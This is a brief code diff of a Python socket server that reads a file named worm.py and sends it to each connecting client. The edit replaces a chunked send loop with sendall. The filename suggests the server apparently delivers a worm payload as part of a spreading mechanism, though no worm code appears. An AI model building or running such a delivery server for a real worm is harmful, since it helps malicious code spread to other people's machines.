@@ -28,14 +28,10 @@ def main():
             print("Connected by", addr)
             worm = open('worm.py', 'rb')
             data = worm.read()
-            while data:
-                conn.send(data)
-                data = worm.read()
-
+            conn.sendall(data)
+            
             worm.close()
             conn.close()
-
-
 
 if __name__ == '__main__':
     main()
